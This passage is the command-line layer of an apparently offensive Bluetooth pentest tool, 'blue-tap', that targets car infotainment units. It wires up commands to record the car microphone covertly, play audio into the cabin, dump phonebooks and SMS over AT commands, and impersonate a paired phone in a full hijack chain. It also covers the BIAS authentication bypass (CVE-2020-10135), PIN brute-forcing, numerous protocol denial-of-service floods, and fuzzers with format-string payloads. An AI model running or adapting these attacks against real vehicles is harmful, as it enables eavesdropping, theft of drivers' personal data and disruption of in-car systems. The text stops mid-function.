# ============================================================================
# AUDIO - Unified Audio Operations (A2DP + HFP via PulseAudio)
# ============================================================================
@main.group()
def audio():
    """Audio capture, injection, and eavesdropping via PulseAudio."""


@audio.command("record-mic")
@click.argument("mac", required=False, default=None)
@click.option("-o", "--output", default="car_mic.wav")
@click.option("-d", "--duration", default=60, help="Duration in seconds (0=until Ctrl+C)")
@click.option("--no-setup", is_flag=True, help="Skip auto profile/mic setup")
def audio_record_mic(mac, output, duration, no_setup):
    """Record from car's Bluetooth microphone (eavesdrop).

    Automatically switches to HFP profile, mutes laptop mic,
    unmutes car mic at 100% volume, and records using parecord.
    """
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import record_car_mic
    record_car_mic(mac, output, duration, auto_setup=not no_setup)


@audio.command("live")
@click.argument("mac", required=False, default=None)
@click.option("--no-setup", is_flag=True)
def audio_live(mac, no_setup):
    """Live eavesdrop: stream car mic to laptop speakers in real-time."""
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import live_eavesdrop
    live_eavesdrop(mac, auto_setup=not no_setup)


@audio.command("play")
@click.argument("mac", required=False, default=None)
@click.argument("audio_file")
@click.option("-v", "--volume", default=80, help="Volume in % (1-100)")
def audio_play(mac, audio_file, volume):
    """Play audio file through car speakers via A2DP."""
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import play_to_car
    play_to_car(mac, audio_file, volume)


@audio.command("loopback")
@click.argument("mac", required=False, default=None)
@click.option("-s", "--mic-source", default=None, help="Laptop mic source (auto-detected)")
def audio_loopback(mac, mic_source):
    """Route laptop mic to car speakers in real-time."""
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import stream_mic_to_car
    stream_mic_to_car(mac, mic_source)


@audio.command("loopback-stop")
def audio_loopback_stop():
    """Stop all audio loopback modules."""
    from blue_tap.attack.a2dp import stop_loopback
    stop_loopback()


@audio.command("capture")
@click.argument("mac", required=False, default=None)
@click.option("-o", "--output", default="a2dp_capture.wav")
@click.option("-d", "--duration", default=60, help="Capture duration in seconds")
def audio_capture_a2dp(mac, output, duration):
    """Capture A2DP media stream to WAV file."""
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import capture_a2dp
    capture_a2dp(mac, output, duration)


@audio.command("profile")
@click.argument("mac", required=False, default=None)
@click.argument("mode", type=click.Choice(["hfp", "a2dp"]))
def audio_profile(mac, mode):
    """Switch Bluetooth audio profile (hfp=mic, a2dp=media)."""
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import set_profile_hfp, set_profile_a2dp
    if mode == "hfp":
        set_profile_hfp(mac)
    else:
        set_profile_a2dp(mac)


@audio.command("devices")
def audio_devices():
    """List Bluetooth audio sources and sinks."""
    from blue_tap.attack.a2dp import list_bt_audio_sources, list_bt_audio_sinks

    sources = list_bt_audio_sources()
    sinks = list_bt_audio_sinks()

    if sources:
        table = Table(title="Bluetooth Audio Sources (Microphones)")
        table.add_column("ID")
        table.add_column("Name")
        table.add_column("State")
        for s in sources:
            table.add_row(s["id"], s["name"], s.get("state", ""))
        console.print(table)

    if sinks:
        table = Table(title="Bluetooth Audio Sinks (Speakers)")
        table.add_column("ID")
        table.add_column("Name")
        for s in sinks:
            table.add_row(s["id"], s["name"])
        console.print(table)

    if not sources and not sinks:
        warning("No Bluetooth audio devices found in PulseAudio/PipeWire")


@audio.command("diagnose")
@click.argument("mac", required=False, default=None)
def audio_diagnose(mac):
    """Diagnose Bluetooth audio issues for a device."""
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import diagnose_bt_audio
    diagnose_bt_audio(mac)


@audio.command("restart")
def audio_restart():
    """Restart PipeWire/PulseAudio to fix audio routing issues."""
    from blue_tap.attack.a2dp import restart_audio_services
    restart_audio_services()


@audio.command("list")
@click.option("-d", "--dir", "directory", default=".", help="Directory to search")
def audio_list(directory):
    """List all captured WAV files with duration and size."""
    from blue_tap.attack.a2dp import list_captures

    captures = list_captures(directory)
    if not captures:
        warning(f"No WAV files found in {directory}")
        return

    table = Table(title="Captured Audio Files", show_lines=True)
    table.add_column("#", style="dim", width=4)
    table.add_column("File", style="cyan")
    table.add_column("Duration", style="green", justify="right")
    table.add_column("Size", style="yellow", justify="right")
    table.add_column("Modified", style="magenta")

    for i, cap in enumerate(captures, 1):
        dur = cap["duration_secs"]
        dur_str = f"{int(dur // 60)}:{int(dur % 60):02d}" if dur > 0 else "N/A"
        size_str = f"{cap['size_bytes'] / 1024:.1f} KB"
        table.add_row(str(i), cap["filename"], dur_str, size_str, cap["modified"])
    console.print(table)


@audio.command("playback")
@click.argument("file")
def audio_playback(file):
    """Play a captured audio file on laptop speakers."""
    from blue_tap.attack.a2dp import play_capture

    if play_capture(file):
        success("Playback complete")
    else:
        error("Playback failed")


@audio.command("review")
@click.option("-d", "--dir", "directory", default=".", help="Directory to search")
def audio_review(directory):
    """Interactive audio review: list, select, play, repeat."""
    from blue_tap.attack.a2dp import interactive_review
    interactive_review(directory)


# ============================================================================
# OPP - Object Push
# ============================================================================
@main.group()
def opp():
    """Object Push Profile - push files to IVI."""


@opp.command("push")
@click.argument("address", required=False, default=None)
@click.argument("filepath")
@click.option("-c", "--channel", type=int, default=None)
def opp_push(address, filepath, channel):
    """Push a file to the target device."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.opp import OPPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Object Push")
        if channel is None:
            channel = find_service_channel(address, "OPP")

    if channel is None:
        error("Could not find OPP channel.")
        return

    client = OPPClient(address, channel=channel)
    if client.connect():
        client.push_file(filepath)
        client.disconnect()


@opp.command("vcard")
@click.argument("address", required=False, default=None)
@click.option("-n", "--name", required=True, help="Contact name")
@click.option("-p", "--phone", required=True, help="Phone number")
@click.option("-e", "--email", default="", help="Email address")
@click.option("-c", "--channel", type=int, default=None)
def opp_vcard(address, name, phone, email, channel):
    """Push a crafted vCard contact to IVI."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.opp import OPPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Object Push")

    if channel is None:
        error("Could not find OPP channel.")
        return

    client = OPPClient(address, channel=channel)
    if client.connect():
        client.push_vcard(name, phone, email)
        client.disconnect()


# ============================================================================
# AT / BLUESNARFER - Direct AT Command Extraction
# ============================================================================
@main.group("at")
def at_cmd():
    """AT command data extraction via RFCOMM (bluesnarfer alternative)."""


@at_cmd.command("connect")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=1, help="RFCOMM channel")
def at_connect(address, channel):
    """Interactive AT command session over RFCOMM."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.bluesnarfer import ATClient

    client = ATClient(address, channel=channel)
    if not client.connect():
        return

    info("AT session ready. Type 'quit' to exit.")
    while True:
        try:
            cmd = input("AT> ").strip()
            if cmd.lower() in ("quit", "exit", "q"):
                break
            if cmd:
                result = client.send_at(cmd)
                console.print(result)
        except (EOFError, KeyboardInterrupt):
            break
    client.disconnect()


@at_cmd.command("dump")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=1)
@click.option("-o", "--output-dir", default="at_dump")
def at_dump(address, channel, output_dir):
    """Dump all data via AT commands: phonebook, SMS, device info."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.bluesnarfer import ATClient

    client = ATClient(address, channel=channel)
    if not client.connect():
        return
    try:
        results = client.dump_all(output_dir)
        if results:
            console.print(f"\n[bold green]Dump complete -> {output_dir}/[/bold green]")
    finally:
        client.disconnect()


@at_cmd.command("snarf")
@click.argument("address", required=False, default=None)
@click.option("-m", "--memory", default="ME",
              type=click.Choice(["SM", "ME", "DC", "RC", "MC", "FD", "ON"]))
@click.option("-r", "--range", "entry_range", default="1-100")
def at_snarf(address, memory, entry_range):
    """Use bluesnarfer binary for phonebook extraction."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.bluesnarfer import bluesnarfer_extract
    parts = entry_range.split("-")
    if len(parts) != 2:
        error("Range must be START-END (e.g., 1-100)")
        return
    try:
        start, end = int(parts[0]), int(parts[1])
    except ValueError:
        error("Range values must be integers")
        return
    bluesnarfer_extract(address, memory, start, end)


# ============================================================================
# VULNSCAN - Vulnerability Scanner
# ============================================================================
@main.command("vulnscan")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def vulnscan(address, hci, output):
    """Scan target for vulnerabilities and attack-surface indicators.

    \b
    Evidence-based checks: SSP/legacy pairing, service exposure (active
    RFCOMM probe), KNOB, BLURtooth, BIAS, BlueBorne, pairing method,
    writable GATT characteristics. Findings are classified as confirmed,
    potential, or unverified with confidence ratings.
    """
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.vuln_scanner import scan_vulnerabilities
    findings = scan_vulnerabilities(address, hci)
    # scan_vulnerabilities already prints the table via _print_findings

    from blue_tap.utils.session import log_command
    log_command("vulnscan", findings, category="vuln", target=address)

    if output:
        _save_json(findings, output)


# ============================================================================
# HIJACK - Full Attack Chain
# ============================================================================
@main.command()
@click.argument("ivi_address", required=False, default=None)
@click.argument("phone_address", required=False, default=None)
@click.option("-n", "--phone-name", default="", help="Phone name to impersonate")
@click.option("-i", "--hci", default="hci0")
@click.option("-o", "--output-dir", default="hijack_output")
@click.option("--recon-only", is_flag=True, help="Only run reconnaissance phase")
@click.option("--skip-audio", is_flag=True, help="Skip audio setup phase")
@click.option("--bias", is_flag=True, help="Use BIAS attack (CVE-2020-10135) for auth bypass")
def hijack(ivi_address, phone_address, phone_name, hci, output_dir,
           recon_only, skip_audio, bias):
    """Full IVI hijack: spoof phone identity and extract data.

    \b
    IVI_ADDRESS:   Target IVI Bluetooth address
    PHONE_ADDRESS: Phone MAC to impersonate

    \b
    Attack phases:
      1. Recon      - Fingerprint IVI, discover services
      2. Impersonate - Spoof MAC + name + device class
      3. Connect     - Connect to IVI as spoofed phone
      4a. PBAP      - Download phonebook & call logs
      4b. MAP       - Download SMS/MMS messages
      5. Audio      - Setup HFP for call interception

    \b
    Use --bias to attempt BIAS (CVE-2020-10135) role-switch attack
    instead of normal pairing. Useful when the IVI validates link keys
    and rejects simple MAC spoofing.
    """
    if not ivi_address or not phone_address:
        result = pick_two_devices()
        if not result:
            error("Device selection cancelled")
            return
        ivi_address, phone_address = result
    from blue_tap.attack.hijack import HijackSession

    verbose(f"Starting hijack session: IVI={ivi_address} Phone={phone_address}")
    session = HijackSession(
        ivi_address=ivi_address,
        phone_address=phone_address,
        phone_name=phone_name,
        hci=hci,
        output_dir=output_dir,
    )

    try:
        if recon_only:
            session.recon()
        elif bias:
            # BIAS path: recon → BIAS auth bypass → dump data
            session.recon()
            if session.connect_bias():
                session.dump_phonebook()
                session.dump_messages()
                if not skip_audio:
                    session.setup_audio()
            results = {"method": "bias", "phases": {"recon": "success"}}
            os.makedirs(output_dir, exist_ok=True)
            _save_json(results, os.path.join(output_dir, "attack_results.json"))
        else:
            results = session.run_full_attack()
            # Save results
            os.makedirs(output_dir, exist_ok=True)
            results_file = os.path.join(output_dir, "attack_results.json")
            _save_json(results, results_file)
    except KeyboardInterrupt:
        warning("\nInterrupted by user")
    finally:
        session.cleanup()


# ============================================================================
# BIAS - Bluetooth Impersonation AttackS (CVE-2020-10135)
# ============================================================================
@main.group()
def bias():
    """BIAS attack — bypass authentication via role-switch (CVE-2020-10135)."""


@bias.command("probe")
@click.argument("ivi_address", required=False, default=None)
@click.argument("phone_address", required=False, default=None)
@click.option("-n", "--phone-name", default="", help="Phone name")
@click.option("-i", "--hci", default="hci0")
def bias_probe(ivi_address, phone_address, phone_name, hci):
    """Probe whether IVI is potentially vulnerable to BIAS.

    \b
    Checks SSP support, BT version, and auto-reconnect behavior.
    Does not attempt the actual attack.
    """
    if not ivi_address or not phone_address:
        result = pick_two_devices()
        if not result:
            error("Device selection cancelled")
            return
        ivi_address, phone_address = result
    from blue_tap.attack.bias import BIASAttack

    attack = BIASAttack(ivi_address, phone_address, phone_name, hci)
    attack.probe_vulnerability()


@bias.command("attack")
@click.argument("ivi_address", required=False, default=None)
@click.argument("phone_address", required=False, default=None)
@click.option("-n", "--phone-name", default="", help="Phone name to impersonate")
@click.option("-i", "--hci", default="hci0")
@click.option("-m", "--method", default="auto",
              type=click.Choice(["auto", "role_switch", "internalblue"]),
              help="Attack method")
def bias_attack(ivi_address, phone_address, phone_name, hci, method):
    """Execute BIAS attack to bypass IVI authentication.

    \b
    Methods:
      auto         - Try role-switch, then suggest InternalBlue
      role_switch  - Software-only SSP downgrade (no special hardware)
      internalblue - Full LMP injection (requires Broadcom chipset)

    \b
    Requires: target IVI address and phone address to impersonate.
    The phone should be a device the IVI has previously paired with.
    """
    if not ivi_address or not phone_address:
        result = pick_two_devices()
        if not result:
            error("Device selection cancelled")
            return
        ivi_address, phone_address = result
    from blue_tap.attack.bias import BIASAttack

    attack = BIASAttack(ivi_address, phone_address, phone_name, hci)
    attack.execute(method)


# ============================================================================
# AVRCP - Media Control
# ============================================================================
@main.group()
def avrcp():
    """AVRCP media control and attacks."""


@avrcp.command("play")
@click.argument("address", required=False, default=None)
def avrcp_play(address):
    """Send play command."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.play()


@avrcp.command("pause")
@click.argument("address", required=False, default=None)
def avrcp_pause(address):
    """Send pause command."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.pause()


@avrcp.command("stop")
@click.argument("address", required=False, default=None)
def avrcp_stop(address):
    """Send stop command."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.stop()


@avrcp.command("next")
@click.argument("address", required=False, default=None)
def avrcp_next(address):
    """Skip to next track."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.next_track()


@avrcp.command("prev")
@click.argument("address", required=False, default=None)
def avrcp_prev(address):
    """Skip to previous track."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.previous_track()


@avrcp.command("volume")
@click.argument("address", required=False, default=None)
@click.argument("level", type=int)
def avrcp_volume(address, level):
    """Set volume (0-127)."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.set_volume(level)


@avrcp.command("volume-ramp")
@click.argument("address", required=False, default=None)
@click.option("--start", default=0, help="Start volume")
@click.option("--end", default=127, help="End volume")
@click.option("--step-ms", default=100, help="Delay between steps (ms)")
def avrcp_volume_ramp(address, start, end, step_ms):
    """Gradually ramp volume (escalation attack)."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.volume_ramp(start=start, target=end, step_ms=step_ms)


@avrcp.command("skip-flood")
@click.argument("address", required=False, default=None)
@click.option("--count", default=100, help="Number of skip commands")
@click.option("--interval", default=0.1, help="Interval between skips (seconds)")
def avrcp_skip_flood(address, count, interval):
    """Rapid track skip injection."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.skip_flood(count, int(interval * 1000))


@avrcp.command("metadata")
@click.argument("address", required=False, default=None)
def avrcp_metadata(address):
    """Show current track metadata."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        track = ctrl.get_track_info()
        status = ctrl.get_status()
        console.print(f"[bold cyan]Status:[/bold cyan] {status}")
        if track:
            for key, val in track.items():
                console.print(f"  [cyan]{key}:[/cyan] {val}")
        else:
            warning("No track info available")


@avrcp.command("monitor")
@click.argument("address", required=False, default=None)
@click.option("-d", "--duration", default=300, help="Monitor duration (seconds)")
def avrcp_monitor(address, duration):
    """Monitor track changes in real-time."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        def on_change(changed):
            if isinstance(changed, dict):
                # May receive full props dict or just track dict
                if "Track" in changed:
                    track = changed["Track"]
                    console.print(f"[green]Track changed:[/green] "
                                  f"{track.get('Artist', '?')} - {track.get('Title', '?')}")
                elif "Title" in changed or "Artist" in changed:
                    console.print(f"[green]Track changed:[/green] "
                                  f"{changed.get('Artist', '?')} - {changed.get('Title', '?')}")
                if "Status" in changed:
                    console.print(f"[yellow]Status:[/yellow] {changed['Status']}")

        ctrl.monitor_metadata(duration, callback=on_change)


# ============================================================================
# DOS - Denial of Service & Pairing Attacks
# ============================================================================
@main.group()
def dos():
    """DoS attacks and pairing abuse."""


@dos.command("pair-flood")
@click.argument("address", required=False, default=None)
@click.option("--count", default=50, help="Number of pairing attempts")
@click.option("--interval", default=0.5, help="Delay between attempts (seconds)")
def dos_pair_flood(address, count, interval):
    """Flood target with pairing requests."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.dos import PairingFlood
    flood = PairingFlood(address)
    result = flood.flood_pairing_requests(count, interval)
    console.print(f"[bold]Results:[/bold] {result}")


@dos.command("name-flood")
@click.argument("address", required=False, default=None)
@click.option("--length", default=248, help="Device name length")
def dos_name_flood(address, length):
    """Pair with max-length device names (memory exhaustion)."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.dos import PairingFlood
    flood = PairingFlood(address)
    result = flood.long_name_flood(length)
    console.print(f"[bold]Results:[/bold] {result}")


@dos.command("rate-test")
@click.argument("address", required=False, default=None)
@click.option("--attempts", default=10, type=int, help="Number of pairing attempts")
@click.option("--pair-timeout", default=5.0, type=float, help="Timeout per pairing attempt (seconds)")
def dos_rate_test(address, attempts, pair_timeout):
    """Detect rate limiting on pairing attempts."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.dos import PairingFlood
    flood = PairingFlood(address)
    result = flood.detect_rate_limiting(attempts=attempts, pair_timeout=pair_timeout)

    if result.get("rate_limited"):
        warning("Rate limiting detected!")
    else:
        success("No rate limiting detected")
    for k, v in result.items():
        info(f"  {k}: {v}")


@dos.command("pin-brute")
@click.argument("address", required=False, default=None)
@click.option("--start", default=0, help="Start PIN")
@click.option("--end", default=9999, help="End PIN")
@click.option("--delay", default=0.5, help="Delay between attempts")
def dos_pin_brute(address, start, end, delay):
    """Brute-force legacy PIN pairing."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.pin_brute import PINBruteForce
    bf = PINBruteForce(address)
    pin = bf.brute_force(start, end, delay)
    if pin:
        success(f"PIN found: {pin}")
    else:
        warning("PIN not found in range")


@dos.command("l2ping-flood")
@click.argument("address", required=False, default=None)
@click.option("-c", "--count", default=1000, help="Number of pings")
@click.option("-s", "--size", default=600, help="Payload size in bytes")
@click.option("--no-flood", is_flag=True, help="Disable flood mode (slower, shows RTT)")
def dos_l2ping_flood(address, count, size, no_flood):
    """L2CAP echo request flood via l2ping (requires root)."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.dos import PairingFlood
    flood = PairingFlood(address)
    result = flood.l2ping_flood(count=count, size=size, flood=not no_flood)
    for k, v in result.items():
        info(f"  {k}: {v}")


# ---- Protocol-level DoS attacks (L2CAP, SDP, RFCOMM, OBEX, HFP) ----

@dos.command("l2cap-config-bomb")
@click.argument("address", required=False, default=None)
@click.option("--rounds", default=100, help="Number of config bombs to send")
def dos_l2cap_config_bomb(address, rounds):
    """L2CAP config option bomb — force memory allocation via unknown options."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import L2CAPDoS
    attack = L2CAPDoS(address)
    result = attack.config_option_bomb(rounds=rounds)
    _show_dos_result(result)


@dos.command("l2cap-cid-exhaust")
@click.argument("address", required=False, default=None)
@click.option("--count", default=200, help="Number of CIDs to exhaust")
def dos_l2cap_cid_exhaust(address, count):
    """L2CAP CID exhaustion — open channels without configuring them."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import L2CAPDoS
    attack = L2CAPDoS(address)
    result = attack.cid_exhaustion(count=count)
    _show_dos_result(result)


@dos.command("l2cap-echo-amp")
@click.argument("address", required=False, default=None)
@click.option("--count", default=500, help="Number of echo requests")
@click.option("--size", default=672, help="Echo payload size")
def dos_l2cap_echo_amp(address, count, size):
    """L2CAP echo amplification — flood with max-size echo requests."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import L2CAPDoS
    attack = L2CAPDoS(address)
    result = attack.echo_amplification(count=count, payload_size=size)
    _show_dos_result(result)


@dos.command("sdp-continuation")
@click.argument("address", required=False, default=None)
@click.option("--connections", default=10, help="Parallel SDP connections")
def dos_sdp_continuation(address, connections):
    """SDP continuation state exhaustion — abandon fragmented SDP sessions."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import SDPDoS
    attack = SDPDoS(address)
    result = attack.continuation_exhaustion(connections=connections)
    _show_dos_result(result)


@dos.command("sdp-des-bomb")
@click.argument("address", required=False, default=None)
@click.option("--depth", default=100, help="DES nesting depth")
def dos_sdp_des_bomb(address, depth):
    """SDP nested DES bomb — recursive data element parsing overload."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import SDPDoS
    attack = SDPDoS(address)
    result = attack.nested_des_bomb(depth=depth)
    _show_dos_result(result)


@dos.command("rfcomm-sabm-flood")
@click.argument("address", required=False, default=None)
@click.option("--count", default=60, help="DLCIs to open (max 60)")
def dos_rfcomm_sabm_flood(address, count):
    """RFCOMM SABM flood — open all 60 DLCIs to exhaust DLC pool."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import RFCOMMDoS
    attack = RFCOMMDoS(address)
    result = attack.sabm_flood(count=count)
    _show_dos_result(result)


@dos.command("rfcomm-mux-flood")
@click.argument("address", required=False, default=None)
@click.option("--count", default=500, help="Multiplexer commands to send")
def dos_rfcomm_mux_flood(address, count):
    """RFCOMM multiplexer flood — flood Test commands on DLCI 0."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import RFCOMMDoS
    attack = RFCOMMDoS(address)
    result = attack.mux_command_flood(count=count)
    _show_dos_result(result)


@dos.command("obex-connect-flood")
@click.argument("address", required=False, default=None)
@click.option("--count", default=20, help="OBEX sessions to open")
def dos_obex_connect_flood(address, count):
    """OBEX session exhaustion — open all OBEX services simultaneously."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import OBEXDoS
    attack = OBEXDoS(address)
    result = attack.connect_flood(count=count)
    _show_dos_result(result)


@dos.command("hfp-at-flood")
@click.argument("address", required=False, default=None)
@click.option("--channel", default=10, help="HFP RFCOMM channel")
@click.option("--count", default=5000, help="AT commands to send")
def dos_hfp_at_flood(address, channel, count):
    """HFP AT command flood — overwhelm the AT command parser."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import HFPDoS
    attack = HFPDoS(address)
    result = attack.at_command_flood(channel=channel, count=count)
    _show_dos_result(result)


@dos.command("hfp-slc-confuse")
@click.argument("address", required=False, default=None)
@click.option("--channel", default=10, help="HFP RFCOMM channel")
def dos_hfp_slc_confuse(address, channel):
    """HFP SLC state machine confusion — out-of-order AT commands."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import HFPDoS
    attack = HFPDoS(address)
    result = attack.slc_state_confusion(channel=channel)
    _show_dos_result(result)


def _show_dos_result(result: dict) -> None:
    """Display DoS attack results."""
    name = result.get("attack", "?")
    target = result.get("target", "?")
    status = result.get("result", "unknown")

    if status == "target_unresponsive":
        success(f"[bold]{name}[/bold] against {target}: target became unresponsive")
    elif status == "success":
        success(f"[bold]{name}[/bold] against {target}: completed")
    else:
        info(f"[bold]{name}[/bold] against {target}: {status}")

    for key in ("packets_sent", "duration_seconds", "notes"):
        val = result.get(key)
        if val:
            info(f"  {key}: {val}")

    from blue_tap.utils.session import log_command
    log_command(f"dos_{name}", result, category="dos", target=result.get("target", ""))


# ============================================================================
# FUZZ - Protocol Fuzzing
# ============================================================================
@main.group()
def fuzz():
    """Protocol fuzzing -- campaign mode, legacy fuzzers, and crash management.

    \b
    Campaign (multi-protocol, dashboard):
      blue-tap fuzz campaign AA:BB:CC:DD:EE:FF
      blue-tap fuzz campaign -p sdp -p rfcomm --duration 30m --capture
      blue-tap fuzz campaign --resume

    \b
    Crash management:
      blue-tap fuzz crashes list
      blue-tap fuzz crashes show 1
      blue-tap fuzz crashes replay 1
      blue-tap fuzz crashes export

    \b
    Legacy single-protocol fuzzers:
      blue-tap fuzz l2cap AA:BB:CC:DD:EE:FF
      blue-tap fuzz rfcomm AA:BB:CC:DD:EE:FF
      blue-tap fuzz at AA:BB:CC:DD:EE:FF
      blue-tap fuzz sdp AA:BB:CC:DD:EE:FF
      blue-tap fuzz bss AA:BB:CC:DD:EE:FF
    """


@fuzz.command("l2cap")
@click.argument("address", required=False, default=None)
@click.option("--psm", default=1, help="L2CAP PSM to fuzz")
@click.option("--count", default=100, help="Number of packets")
@click.option("--mode", default="malformed",
              type=click.Choice(["oversized", "malformed", "null"]))
def fuzz_l2cap(address, psm, count, mode):
    """Fuzz L2CAP protocol."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.fuzz import L2CAPFuzzer
    fuzzer = L2CAPFuzzer(address)
    if mode == "oversized":
        result = fuzzer.oversized_mtu(psm)
    elif mode == "null":
        result = fuzzer.null_flood(psm, count)
    else:
        result = fuzzer.malformed_packets(psm, count)
    console.print(f"[bold]Fuzz results:[/bold] {result}")


@fuzz.command("rfcomm")
@click.argument("address", required=False, default=None)
@click.option("--channel", default=1, help="RFCOMM channel")
@click.option("--mode", default="exhaust",
              type=click.Choice(["exhaust", "overflow", "at"]))
def fuzz_rfcomm(address, channel, mode):
    """Fuzz RFCOMM protocol."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.fuzz import RFCOMMFuzzer
    fuzzer = RFCOMMFuzzer(address)
    if mode == "exhaust":
        result = fuzzer.channel_exhaustion()
    elif mode == "overflow":
        result = fuzzer.large_payload(channel)
    else:
        result = fuzzer.at_fuzz(channel)
    console.print(f"[bold]Fuzz results:[/bold] {result}")


@fuzz.command("at")
@click.argument("address", required=False, default=None)
@click.option("--channel", default=1, help="RFCOMM channel")
@click.option("--patterns", default="long,null,format,unicode,overflow",
              help="Comma-separated: long,null,format,unicode,overflow")
def fuzz_at(address, channel, patterns):
    """AT command fuzzing with malformed inputs."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.fuzz import RFCOMMFuzzer

    # Map keyword names to actual fuzz patterns
    pattern_map = {
        "long": "AT" + "A" * 1024 + "\r\n",
        "null": "AT\x00\x00\r\n",
        "format": "AT%n%n%x%x\r\n",
        "unicode": "AT" + "\u00c4" * 256 + "\r\n",
        "overflow": "AT+" + "B" * 512 + "\r\n",
    }
    pattern_list = []
    for name in patterns.split(","):
        name = name.strip()
        if name in pattern_map:
            pattern_list.append(pattern_map[name])
        else:
            pattern_list.append(name)  # Allow raw patterns too

    fuzzer = RFCOMMFuzzer(address)
    result = fuzzer.at_fuzz(channel, pattern_list)
    console.print(f"[bold]AT fuzz results:[/bold] {result}")


@fuzz.command("sdp")
@click.argument("address", required=False, default=None)
def fuzz_sdp(address):
    """SDP continuation state probe (BlueBorne CVE-2017-0785 vector)."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.fuzz import SDPFuzzer
    fuzzer = SDPFuzzer(address)
    result = fuzzer.probe_continuation_state()
    if result.get("leak_suspected"):
        warning("Possible SDP info leak detected!")
    console.print(f"[bold]SDP probe results:[/bold] {result}")


@fuzz.command("bss")
@click.argument("address", required=False, default=None)
def fuzz_bss(address):
    """Run Bluetooth Stack Smasher (external tool)."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.fuzz import bss_wrapper
    if not bss_wrapper(address):
        error("BSS not available or failed")


# Register new protocol-aware fuzz commands (campaign dashboard + crash management)
try:
    from blue_tap.fuzz.cli_commands import register_fuzz_commands
    register_fuzz_commands(fuzz)
except ImportError as exc:
    warning(f"Extended fuzz commands unavailable: {exc}")


# ============================================================================
# REPORT - Pentest Report Generation
# ============================================================================
@main.command("report")
@click.argument("dump_dir", required=False, default=None)
@click.option("-f", "--format", "fmt", default="html",
              type=click.Choice(["html", "json"]))
@click.option("-o", "--output", default=None, help="Output file")
def report_cmd(dump_dir, fmt, output):
    """Generate pentest report from the current session.

    \b
    Auto-collects all data from the active session. Pass a directory
    to report from a specific location instead.

    Examples:
      blue-tap report                              # current session
      blue-tap -s mytest report                    # named session
      blue-tap report ./hijack_output              # specific directory
    """
    from blue_tap.report.generator import ReportGenerator
    from blue_tap.utils.session import get_session

    report = ReportGenerator()
    session = get_session()

    if session:
        # Auto-collect from session
        session_data = session.get_all_data()
        info(f"Collecting data from session '{session.name}'...")

        # Feed session data into report
        for entry in session_data.get("scan", []):
            data = entry.get("data", [])
            if isinstance(data, list):
                report.add_scan_results(data)

        for entry in session_data.get("recon", []):
            data = entry.get("data", {})
            if isinstance(data, dict) and data.get("address"):
